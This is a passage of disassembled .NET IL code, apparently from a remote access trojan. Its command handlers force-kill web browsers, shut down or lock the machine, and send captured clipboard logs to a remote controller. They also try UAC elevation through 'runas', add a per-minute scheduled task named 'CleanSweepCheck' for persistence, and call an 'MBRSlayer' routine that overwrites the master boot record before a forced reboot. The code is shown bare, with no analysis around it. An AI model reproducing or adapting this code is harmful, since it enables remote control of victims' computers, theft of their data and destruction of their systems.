      IL_1cdb:  ldnull
      IL_1cdc:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1ce1:  ldc.i4.4
      IL_1ce2:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1ce7:  pop
      IL_1ce8:  ldstr      "MS_WebcheckMonitor"
      IL_1ced:  ldnull
      IL_1cee:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1cf3:  ldc.i4.4
      IL_1cf4:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1cf9:  pop
      IL_1cfa:  ldstr      "Windows Push Notifications Platform"
      IL_1cff:  ldnull
      IL_1d00:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1d05:  ldc.i4.4
      IL_1d06:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1d0b:  pop
      IL_1d0c:  br         IL_266b

      IL_1d11:  ldc.i4.1
      IL_1d12:  newarr     [mscorlib]System.String
      IL_1d17:  dup
      IL_1d18:  ldc.i4.0
      IL_1d19:  ldstr      "cmd /c taskkill /f /im Chrome.exe"
      IL_1d1e:  stelem.ref
      IL_1d1f:  call       string [mscorlib]System.String::Concat(string[])
      IL_1d24:  ldc.i4.0
      IL_1d25:  ldc.i4.1
      IL_1d26:  ldc.i4     0x1388
      IL_1d2b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_1d30:  pop
      IL_1d31:  ldc.i4.1
      IL_1d32:  newarr     [mscorlib]System.String
      IL_1d37:  dup
      IL_1d38:  ldc.i4.0
      IL_1d39:  ldstr      "cmd /c taskkill /f /im Firefox.exe"
      IL_1d3e:  stelem.ref
      IL_1d3f:  call       string [mscorlib]System.String::Concat(string[])
      IL_1d44:  ldc.i4.0
      IL_1d45:  ldc.i4.1
      IL_1d46:  ldc.i4     0x1388
      IL_1d4b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_1d50:  pop
      IL_1d51:  ldc.i4.1
      IL_1d52:  newarr     [mscorlib]System.String
      IL_1d57:  dup
      IL_1d58:  ldc.i4.0
      IL_1d59:  ldstr      "cmd /c taskkill /f /im Chromium.exe"
      IL_1d5e:  stelem.ref
      IL_1d5f:  call       string [mscorlib]System.String::Concat(string[])
      IL_1d64:  ldc.i4.0
      IL_1d65:  ldc.i4.1
      IL_1d66:  ldc.i4     0x1388
      IL_1d6b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_1d70:  pop
      IL_1d71:  ldc.i4.1
      IL_1d72:  newarr     [mscorlib]System.String
      IL_1d77:  dup
      IL_1d78:  ldc.i4.0
      IL_1d79:  ldstr      "cmd /c taskkill /f /im Opera.exe"
      IL_1d7e:  stelem.ref
      IL_1d7f:  call       string [mscorlib]System.String::Concat(string[])
      IL_1d84:  ldc.i4.0
      IL_1d85:  ldc.i4.1
      IL_1d86:  ldc.i4     0x1388
      IL_1d8b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_1d90:  pop
      IL_1d91:  ldc.i4.1
      IL_1d92:  newarr     [mscorlib]System.String
      IL_1d97:  dup
      IL_1d98:  ldc.i4.0
      IL_1d99:  ldstr      "cmd /c taskkill /f /im OperaGX.exe"
      IL_1d9e:  stelem.ref
      IL_1d9f:  call       string [mscorlib]System.String::Concat(string[])
      IL_1da4:  ldc.i4.0
      IL_1da5:  ldc.i4.1
      IL_1da6:  ldc.i4     0x1388
      IL_1dab:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_1db0:  pop
      IL_1db1:  ldc.i4.1
      IL_1db2:  newarr     [mscorlib]System.String
      IL_1db7:  dup
      IL_1db8:  ldc.i4.0
      IL_1db9:  ldstr      "cmd /c taskkill /f /im MsEdge.exe"
      IL_1dbe:  stelem.ref
      IL_1dbf:  call       string [mscorlib]System.String::Concat(string[])
      IL_1dc4:  ldc.i4.0
      IL_1dc5:  ldc.i4.1
      IL_1dc6:  ldc.i4     0x1388
      IL_1dcb:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_1dd0:  pop
      IL_1dd1:  ldc.i4.1
      IL_1dd2:  newarr     [mscorlib]System.String
      IL_1dd7:  dup
      IL_1dd8:  ldc.i4.0
      IL_1dd9:  ldstr      "cmd /c taskkill /f /im Safari.exe"
      IL_1dde:  stelem.ref
      IL_1ddf:  call       string [mscorlib]System.String::Concat(string[])
      IL_1de4:  ldc.i4.0
      IL_1de5:  ldc.i4.1
      IL_1de6:  ldc.i4     0x1388
      IL_1deb:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_1df0:  pop
      IL_1df1:  ldc.i4.1
      IL_1df2:  newarr     [mscorlib]System.String
      IL_1df7:  dup
      IL_1df8:  ldc.i4.0
      IL_1df9:  ldstr      "cmd /c taskkill /f /im Brave.exe"
      IL_1dfe:  stelem.ref
      IL_1dff:  call       string [mscorlib]System.String::Concat(string[])
      IL_1e04:  ldc.i4.0
      IL_1e05:  ldc.i4.1
      IL_1e06:  ldc.i4     0x1388
      IL_1e0b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_1e10:  pop
      IL_1e11:  ldc.i4.1
      IL_1e12:  newarr     [mscorlib]System.String
      IL_1e17:  dup
      IL_1e18:  ldc.i4.0
      IL_1e19:  ldstr      "cmd /c taskkill /f /im Iridium.exe"
      IL_1e1e:  stelem.ref
      IL_1e1f:  call       string [mscorlib]System.String::Concat(string[])
      IL_1e24:  ldc.i4.0
      IL_1e25:  ldc.i4.1
      IL_1e26:  ldc.i4     0x1388
      IL_1e2b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_1e30:  pop
      IL_1e31:  ldc.i4.1
      IL_1e32:  newarr     [mscorlib]System.String
      IL_1e37:  dup
      IL_1e38:  ldc.i4.0
      IL_1e39:  ldstr      "cmd /c taskkill /f /im Dissenter.exe"
      IL_1e3e:  stelem.ref
      IL_1e3f:  call       string [mscorlib]System.String::Concat(string[])
      IL_1e44:  ldc.i4.0
      IL_1e45:  ldc.i4.1
      IL_1e46:  ldc.i4     0x1388
      IL_1e4b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_1e50:  pop
      IL_1e51:  ldc.i4.1
      IL_1e52:  newarr     [mscorlib]System.String
      IL_1e57:  dup
      IL_1e58:  ldc.i4.0
      IL_1e59:  ldstr      "cmd /c taskkill /f /im PaleMoon.exe"
      IL_1e5e:  stelem.ref
      IL_1e5f:  call       string [mscorlib]System.String::Concat(string[])
      IL_1e64:  ldc.i4.0
      IL_1e65:  ldc.i4.1
      IL_1e66:  ldc.i4     0x1388
      IL_1e6b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_1e70:  pop
      IL_1e71:  ldc.i4.1
      IL_1e72:  newarr     [mscorlib]System.String
      IL_1e77:  dup
      IL_1e78:  ldc.i4.0
      IL_1e79:  ldstr      "cmd /c taskkill /f /im Vivaldi.exe"
      IL_1e7e:  stelem.ref
      IL_1e7f:  call       string [mscorlib]System.String::Concat(string[])
      IL_1e84:  ldc.i4.0
      IL_1e85:  ldc.i4.1
      IL_1e86:  ldc.i4     0x1388
      IL_1e8b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_1e90:  pop
      IL_1e91:  ldc.i4.1
      IL_1e92:  newarr     [mscorlib]System.String
      IL_1e97:  dup
      IL_1e98:  ldc.i4.0
      IL_1e99:  ldstr      "cmd /c taskkill /f /im iExplore.exe"
      IL_1e9e:  stelem.ref
      IL_1e9f:  call       string [mscorlib]System.String::Concat(string[])
      IL_1ea4:  ldc.i4.0
      IL_1ea5:  ldc.i4.1
      IL_1ea6:  ldc.i4     0x1388
      IL_1eab:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_1eb0:  pop
      IL_1eb1:  br         IL_266b

      IL_1eb6:  ldc.i4.1
      IL_1eb7:  newarr     [mscorlib]System.String
      IL_1ebc:  dup
      IL_1ebd:  ldc.i4.0
      IL_1ebe:  ldstr      "cmd /c shutdown /s /f /t 60"
      IL_1ec3:  stelem.ref
      IL_1ec4:  call       string [mscorlib]System.String::Concat(string[])
      IL_1ec9:  ldc.i4.0
      IL_1eca:  ldc.i4.1
      IL_1ecb:  ldc.i4     0x1388
      IL_1ed0:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_1ed5:  pop
      IL_1ed6:  br         IL_266b

      IL_1edb:  call       void Stub.xxma::Start()
      IL_1ee0:  ldstr      "on"
      IL_1ee5:  stsfld     string j.OK::nowifi
      IL_1eea:  br         IL_266b

      IL_1eef:  ldstr      "off"
      IL_1ef4:  stsfld     string j.OK::nowifi
      IL_1ef9:  br         IL_266b

      IL_1efe:  ldnull
      IL_1eff:  ldftn      void j.OK::Mouse()
      IL_1f05:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_1f0a:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
      IL_1f0f:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_1f14:  br         IL_266b

      IL_1f19:  ldnull
      IL_1f1a:  ldftn      void j.OK::Crazy()
      IL_1f20:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_1f25:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
      IL_1f2a:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_1f2f:  br         IL_266b

      IL_1f34:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_1f39:  ldstr      "clip.txt"
      IL_1f3e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_1f43:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_1f48:  brfalse.s  IL_1f94

      .try
      {
        IL_1f4a:  call       string [mscorlib]System.IO.Path::GetTempPath()
        IL_1f4f:  ldstr      "clip.txt"
        IL_1f54:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_1f59:  call       string [mscorlib]System.IO.File::ReadAllText(string)
        IL_1f5e:  stsfld     string j.OK::CLIP
        IL_1f63:  ldstr      "LKP"
        IL_1f68:  ldsfld     string j.OK::Y
        IL_1f6d:  ldsfld     string j.OK::CLIP
        IL_1f72:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_1f77:  call       bool j.OK::Send(string)
        IL_1f7c:  pop
        IL_1f7d:  leave      IL_266b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_1f82:  dup
        IL_1f83:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1f88:  stloc.s    V_51
        IL_1f8a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1f8f:  leave      IL_266b

      }  // end handler
      IL_1f94:  ldstr      "LKP"
      IL_1f99:  ldsfld     string j.OK::Y
      IL_1f9e:  ldstr      "Error occured trying to get logs. possible error l"
      + "og file not exists, try grabbing the clipboard first."
      IL_1fa3:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_1fa8:  call       bool j.OK::Send(string)
      IL_1fad:  pop
      IL_1fae:  br         IL_266b

      IL_1fb3:  call       native int j.OK::GetDesktopWindow()
      IL_1fb8:  call       native int j.OK::GetWindowDC(native int)
      IL_1fbd:  stloc.s    V_52
      IL_1fbf:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_1fc4:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_1fc9:  stloc.s    V_33
      IL_1fcb:  ldloca.s   V_33
      IL_1fcd:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_1fd2:  stloc.s    V_53
      IL_1fd4:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_1fd9:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_1fde:  stloc.s    V_33
      IL_1fe0:  ldloca.s   V_33
      IL_1fe2:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_1fe7:  stloc.s    V_54
      IL_1fe9:  ldloc.s    V_52
      IL_1feb:  ldc.i4.s   25
      IL_1fed:  ldc.i4.s   25
      IL_1fef:  ldloc.s    V_53
      IL_1ff1:  ldc.i4.s   50
      IL_1ff3:  sub.ovf
      IL_1ff4:  ldloc.s    V_54
      IL_1ff6:  ldc.i4.s   50
      IL_1ff8:  sub.ovf
      IL_1ff9:  ldloc.s    V_52
      IL_1ffb:  ldc.i4.0
      IL_1ffc:  ldc.i4.0
      IL_1ffd:  ldloc.s    V_53
      IL_1fff:  ldloc.s    V_54
      IL_2001:  ldc.i4     0xcc0020
      IL_2006:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_200b:  pop
      IL_200c:  br         IL_266b

      IL_2011:  call       native int j.OK::GetDesktopWindow()
      IL_2016:  call       native int j.OK::GetWindowDC(native int)
      IL_201b:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_2020:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_2025:  stloc.s    V_33
      IL_2027:  ldloca.s   V_33
      IL_2029:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_202e:  stloc.s    V_55
      IL_2030:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_2035:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_203a:  stloc.s    V_33
      IL_203c:  ldloca.s   V_33
      IL_203e:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_2043:  stloc.s    V_56
      IL_2045:  newobj     instance void [mscorlib]System.Random::.ctor()
      IL_204a:  ldc.i4.0
      IL_204b:  ldc.i4     0x1000000
      IL_2050:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                        int32)
      IL_2055:  conv.ovf.u4
      IL_2056:  call       native int j.OK::CreateSolidBrush(uint32)
      IL_205b:  stloc.s    V_57
      IL_205d:  dup
      IL_205e:  ldloc.s    V_57
      IL_2060:  call       native int j.OK::SelectObject(native int,
                                                         native int)
      IL_2065:  pop
      IL_2066:  ldc.i4.0
      IL_2067:  ldc.i4.0
      IL_2068:  ldloc.s    V_55
      IL_206a:  ldloc.s    V_56
      IL_206c:  ldc.i4     0x5a0049
      IL_2071:  call       bool j.OK::PatBlt(native int,
                                             int32,
                                             int32,
                                             int32,
                                             int32,
                                             valuetype j.OK/TernaryRasterOperations)
      IL_2076:  pop
      IL_2077:  ldloc.s    V_57
      IL_2079:  call       bool j.OK::DeleteObject(native int)
      IL_207e:  pop
      IL_207f:  br         IL_266b

      IL_2084:  ldstr      "cmd /c rundll32.exe user32.dll,LockWorkStation"
      IL_2089:  ldc.i4.0
      IL_208a:  ldc.i4.1
      IL_208b:  ldc.i4     0x1388
      IL_2090:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_2095:  pop
      IL_2096:  br         IL_266b

      IL_209b:  nop
      .try
      {
        IL_209c:  newobj     instance void [System]System.Diagnostics.ProcessStartInfo::.ctor()
        IL_20a1:  dup
        IL_20a2:  ldc.i4.1
        IL_20a3:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_UseShellExecute(bool)
        IL_20a8:  dup
        IL_20a9:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
        IL_20ae:  call       string [mscorlib]System.IO.Path::GetFileName(string)
        IL_20b3:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_FileName(string)
        IL_20b8:  dup
        IL_20b9:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
        IL_20be:  callvirt   instance string [mscorlib]System.AppDomain::get_BaseDirectory()
        IL_20c3:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_WorkingDirectory(string)
        IL_20c8:  dup
        IL_20c9:  ldstr      "runas"
        IL_20ce:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_Verb(string)
        IL_20d3:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(class [System]System.Diagnostics.ProcessStartInfo)
        IL_20d8:  pop
        IL_20d9:  ldstr      "taskkill /f /im "
        IL_20de:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
        IL_20e3:  call       string [mscorlib]System.IO.Path::GetFileName(string)
        IL_20e8:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_20ed:  ldc.i4.0
        IL_20ee:  ldc.i4.1
        IL_20ef:  ldc.i4     0x1388
        IL_20f4:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                   valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                   bool,
                                                                                                   int32)
        IL_20f9:  pop
        IL_20fa:  leave      IL_266b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_20ff:  dup
        IL_2100:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_2105:  stloc.s    V_58
        IL_2107:  ldstr      "MSG"
        IL_210c:  ldsfld     string j.OK::Y
        IL_2111:  ldstr      "UAC Fail, WTF\?: "
        IL_2116:  ldloc.s    V_58
        IL_2118:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_211d:  callvirt   instance string [mscorlib]System.String::ToString()
        IL_2122:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_2127:  call       bool j.OK::Send(string)
        IL_212c:  pop
        IL_212d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_2132:  leave      IL_266b

      }  // end handler
      IL_2137:  ldstr      "schtasks /create /sc minute /mo 1 /tn CleanSweepCh"
      + "eck /tr "
      IL_213c:  call       class [mscorlib]System.AppDomain [mscorlib]System.AppDomain::get_CurrentDomain()
      IL_2141:  callvirt   instance string [mscorlib]System.AppDomain::get_BaseDirectory()
      IL_2146:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_214b:  call       string [mscorlib]System.IO.Path::GetFileName(string)
      IL_2150:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_2155:  ldc.i4.0
      IL_2156:  ldc.i4.1
      IL_2157:  ldc.i4     0x1388
      IL_215c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_2161:  pop
      IL_2162:  br         IL_266b

      IL_2167:  ldstr      "schtasks /delete /tn CleanSweepCheck /f"
      IL_216c:  ldc.i4.0
      IL_216d:  ldc.i4.1
      IL_216e:  ldc.i4     0x1388
      IL_2173:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_2178:  pop
      IL_2179:  br         IL_266b

      IL_217e:  nop
      .try
      {
        IL_217f:  ldstr      "C: //test.txt"
        IL_2184:  call       class [mscorlib]System.IO.FileStream [mscorlib]System.IO.File::Create(string)
        IL_2189:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
        IL_218e:  ldstr      "MSG"
        IL_2193:  ldsfld     string j.OK::Y
        IL_2198:  ldstr      "AdminCheck: MBR Overwritten."
        IL_219d:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_21a2:  call       bool j.OK::Send(string)
        IL_21a7:  pop
        IL_21a8:  ldstr      "XMG"
        IL_21ad:  ldsfld     string j.OK::Y
        IL_21b2:  ldstr      "MBR Overwritten, successfully."
        IL_21b7:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_21bc:  call       bool j.OK::Send(string)
        IL_21c1:  pop
        IL_21c2:  call       void Stub.MBRSlayer::Start()
        IL_21c7:  ldstr      "cmd /c start shutdown /r /f /t 3"
        IL_21cc:  ldc.i4.0
        IL_21cd:  ldc.i4.1
        IL_21ce:  ldc.i4     0x1388
        IL_21d3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                   valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                   bool,
                                                                                                   int32)
        IL_21d8:  pop
        IL_21d9:  ldstr      "C://test.txt"
        IL_21de:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_21e3:  leave      IL_266b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_21e8:  dup
        IL_21e9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_21ee:  stloc.s    V_59
        IL_21f0:  ldloc.s    V_59
        IL_21f2:  callvirt   instance string [mscorlib]System.Exception::ToString()
        IL_21f7:  ldstr      "denied"
        IL_21fc:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_2201:  brfalse.s  IL_2237

        IL_2203:  ldstr      "MSG"
        IL_2208:  ldsfld     string j.OK::Y
        IL_220d:  ldstr      "AdminCheck: Can't use MBR. (No admin)"
        IL_2212:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_2217:  call       bool j.OK::Send(string)
        IL_221c:  pop
        IL_221d:  ldstr      "XMG"
        IL_2222:  ldsfld     string j.OK::Y
        IL_2227:  ldstr      "Cannot overwrite MBR, needs Admin privilege"
        IL_222c:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_2231:  call       bool j.OK::Send(string)
        IL_2236:  pop
        IL_2237:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_223c:  leave      IL_266b

      }  // end handler
      IL_2241:  nop
      .try
      {
        IL_2242:  ldstr      "C://test.txt"
        IL_2247:  call       class [mscorlib]System.IO.FileStream [mscorlib]System.IO.File::Create(string)
        IL_224c:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
        IL_2251:  ldstr      "MSG"
        IL_2256:  ldsfld     string j.OK::Y
        IL_225b:  ldstr      "AdminCheck: MBR Overwritten."
        IL_2260:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_2265:  call       bool j.OK::Send(string)
        IL_226a:  pop
        IL_226b:  ldstr      "XMG"
        IL_2270:  ldsfld     string j.OK::Y
        IL_2275:  ldstr      "MBR Overwritten, successfully."
        IL_227a:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_227f:  call       bool j.OK::Send(string)
        IL_2284:  pop
        IL_2285:  call       void Stub.MBRSlayer::Start()
        IL_228a:  ldstr      "C://test.txt"
        IL_228f:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_2294:  leave      IL_266b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_2299:  dup
        IL_229a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_229f:  stloc.s    V_60
        IL_22a1:  ldloc.s    V_60
        IL_22a3:  callvirt   instance string [mscorlib]System.Exception::ToString()
        IL_22a8:  ldstr      "denied"
        IL_22ad:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_22b2:  brfalse.s  IL_22e8

        IL_22b4:  ldstr      "MSG"
        IL_22b9:  ldsfld     string j.OK::Y
        IL_22be:  ldstr      "AdminCheck: Can't use MBR. (No admin)"
        IL_22c3:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_22c8:  call       bool j.OK::Send(string)
        IL_22cd:  pop
        IL_22ce:  ldstr      "XMG"
        IL_22d3:  ldsfld     string j.OK::Y
        IL_22d8:  ldstr      "Cannot overwrite MBR, needs Admin privilege"
        IL_22dd:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_22e2:  call       bool j.OK::Send(string)
        IL_22e7:  pop
        IL_22e8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_22ed:  leave      IL_266b

      }  // end handler
      IL_22f2:  nop
      .try
      {
        IL_22f3:  ldstr      "C://test.txt"
        IL_22f8:  call       class [mscorlib]System.IO.FileStream [mscorlib]System.IO.File::Create(string)
        IL_22fd:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
        IL_2302:  ldstr      "MSG"
        IL_2307:  ldsfld     string j.OK::Y
        IL_230c:  ldstr      "AdminCheck: You have admin rights."
        IL_2311:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_2316:  call       bool j.OK::Send(string)
        IL_231b:  pop
        IL_231c:  ldstr      "XMG"
        IL_2321:  ldsfld     string j.OK::Y
        IL_2326:  ldstr      "AdminCheck: You have admin rights."
        IL_232b:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_2330:  call       bool j.OK::Send(string)
        IL_2335:  pop
        IL_2336:  ldstr      "C://test.txt"
        IL_233b:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_2340:  leave      IL_266b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_2345:  dup
        IL_2346:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_234b:  stloc.s    V_61
        IL_234d:  ldloc.s    V_61
        IL_234f:  callvirt   instance string [mscorlib]System.Exception::ToString()
        IL_2354:  ldstr      "denied"
        IL_2359:  callvirt   instance bool [mscorlib]System.String::Contains(string)
        IL_235e:  brfalse.s  IL_2394

        IL_2360:  ldstr      "MSG"
        IL_2365:  ldsfld     string j.OK::Y
        IL_236a:  ldstr      "AdminCheck: You have no admin rights."
        IL_236f:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_2374:  call       bool j.OK::Send(string)
        IL_2379:  pop
        IL_237a:  ldstr      "XMG"
        IL_237f:  ldsfld     string j.OK::Y
        IL_2384:  ldstr      "AdminCheck: You have no admin rights."
        IL_2389:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
